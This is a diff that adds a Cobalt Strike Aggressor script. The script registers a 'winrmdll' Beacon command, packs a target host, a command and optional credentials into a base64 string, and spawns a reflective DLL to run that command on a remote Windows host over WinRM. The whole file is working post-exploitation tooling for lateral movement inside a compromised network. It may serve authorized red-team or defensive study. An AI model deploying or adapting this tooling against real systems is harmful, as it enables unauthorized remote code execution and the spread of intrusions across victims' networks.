@@ -1,0 +1,46 @@
+beacon_command_register(
+	"winrmdll",
+	"Reflective DLL: WinRM",
+	"A Bit of magic to execute WinRM as a Reflective DLL\nwinrmdll <host> <command> [username] [password]\ncc @__mez0__"
+);
+
+alias winrmdll
+{
+	$bid = $1;
+
+	$barch = barch($1);
+
+	if(size(@_) < 3)
+	{
+		berror($bid, "winrmdll: not enough arguments!");
+		return;
+	}
+
+	else if(size(@_) eq 3)
+	{
+		$host = $2;
+		$command = $3;
+		$username = "NULL";
+		$password = "NULL";
+	}
+
+	else if(size(@_) eq 5)
+	{
+		$host = $2;
+		$command = $3;
+		$username = $4;
+		$password = $5;	
+	}
+
+	else
+	{
+		berror($bid, "winrmdll: Theres an error in the arguments!");
+		return;	
+	}
+
+	$params = base64_encode($host ."||". $command ."||". $username ."||". $password);
+
+	$dll = script_resource("reflective-winrm.dll");
+
+	bdllspawn($bid, $dll, $params, "WinRM DLL", 10000, true);
+}
